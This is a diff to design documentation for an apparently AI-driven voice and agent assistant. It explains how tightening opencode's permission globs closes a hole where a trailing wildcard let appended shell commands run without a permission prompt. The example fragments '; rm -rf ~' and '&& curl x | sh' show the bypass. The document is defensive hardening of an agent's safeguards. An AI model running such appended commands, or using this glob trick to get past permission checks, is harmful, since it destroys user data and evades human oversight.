@@ -154,39 +154,51 @@ is what pins that. So portability has to live in the committed bytes.
 
 **What the glob does and does not widen.** opencode's matcher (`Wildcard.match`,
 transcribed in `tests/test_foreign_tool_surface.py`) is a general glob: `*`
-crosses `/`, and a trailing `" *"` is optional. So `*/.r2d2/r2d2_do.py *` matches
+crosses `/`, and a trailing `" *"` is optional. So `*/.r2d2/r2d2_do.py` matches
 `$HOME/.r2d2/r2d2_do.py` on any account, and it matches nothing that is not
 literally a `r2d2_do.py` inside a directory named `.r2d2` — the one directory
-`scripts/install.sh` creates. Creating a *different* `r2d2_do.py` to run instead is
-not free: it takes `edit` or an unlisted `bash` command, and both are `ask` on
-both agents. The failure mode is also the safe direction: if a future opencode
-ever stopped letting `*` cross `/`, these rules would match nothing and every call
-would become a question — not an allow.
+`scripts/install.sh` creates. Substituting paths at install time is not available
+for the reason above: the installed config must stay byte-identical, so
+portability lives in the committed bytes.
 
-**What the shim itself has to carry.** The one thing a glob cannot express is
-*which checkout the shim's own imports come from*, so the shim does not hard-code
-it either: `VENV_PY` and the shebang carry an `@R2D2_REPO@` template, the
-installer substitutes the checkout it ran from, and a copy that was never
-substituted finds its venv from `__file__`. See `docs/08-deployment.md` §2.2.
+**Why no grant ends in `" *"`, which is the whole safety argument.** opencode's
+`bash` is a POSIX shell, and its matcher is a dotall glob, so a grant of
+`*/.r2d2/r2d2_do.py *` admits `<prefix>; rm -rf ~`, `<prefix> && curl x | sh`,
+and a newline after it — all resolving to `allow`, with no permission question.
+The shim's own `risk_level` gate cannot help, because it is only reached when the
+command *is* the shim, and the appended text is never handed to it. The nine
+read-only probes this file used to grant (`upower *`, `ps *`, `date *` and six
+more) had the same hole one character each, and `r2d2_do.py status` already
+reports battery, cpu, memory and uptime, so they bought nothing.
 
-plus nine read-only status probes: `upower *`, `cat /sys/class/power_supply/*`,
-`df *`, `free *`, `uname *`, `hostname *`, `ps *`, `uptime *`, `date *`.
+So every grant is a **full command**: `*/.r2d2/r2d2_do.py status`. An exact
+pattern matches itself and nothing else, so any suffix falls through to the
+catch-all `ask`. `status` is the one call that must not cost a question — it
+takes no argument and is what the latency budget spends. Every shim call carrying
+the user's own words (`tg`, `arxiv`, `open-app`) asks, which is the intent:
+those change something outside the turn.
+`tests/test_r2d2_opencode_config.py::test_no_grant_admits_a_suffix_of_the_callers_choosing`
+and its siblings fail the moment a `" *"` comes back, so this cannot regress
+silently.
 
 **The trust boundary this creates.** `r2d2_do.py shell <command>` is inside
-that allowlist, so it does not raise an opencode permission prompt. Two things
-stand in front of it, and neither is opencode:
+that catch-all `ask`, not inside a grant, so reaching it costs a permission
+question and the shim's `risk_level` gate is the second lock behind it. Two
+things stand in front of it:
 
 1. `r2d2-voice` cannot reach it — three `deny` rules for the `shell` subcommand
    come last in the voice `bash` block, its prompt forbids it outright, and
    such a request is escalated with the `[[NEEDS_AGENT]]` sentinel instead.
-   That block's catch-all is `ask` (C5b), so these three rules are now the ONLY
-   thing refusing it in opencode, and their position after the allowlist is what
-   makes them win under "last match wins".
-2. `r2d2-agent` can, and the shim's own `risk_level` gate is the gate: it exits
-   2 without executing, the prompt makes the agent relay the question verbatim,
-   and the command runs only after the user agrees. R2D2's permission broker
-   (todo 14) never sends `always` for a bash rule (C5) — one `always` would
-   grant that command mask permanently.
+2. `r2d2-agent` can, once you agree: it exits 2 without executing, the prompt
+   makes the agent relay the question verbatim, and the command runs only after
+   the user agrees. R2D2's permission broker (todo 14) never sends `always` for
+   a bash rule (C5) — one `always` would grant that command mask permanently.
+
+**What the shim itself has to carry.** The one thing a pattern cannot express is
+*which checkout the shim's own imports come from*, so the shim does not hard-code
+it either: `VENV_PY` and the shebang carry an `@R2D2_REPO@` template, the
+installer substitutes the checkout it ran from, and a copy that was never
+substituted finds its venv from `__file__`. See `docs/08-deployment.md` §2.2.
 
 If the shim's subcommands ever change, update the allowlist and
 `READ_ONLY_PROBES` in the test together.
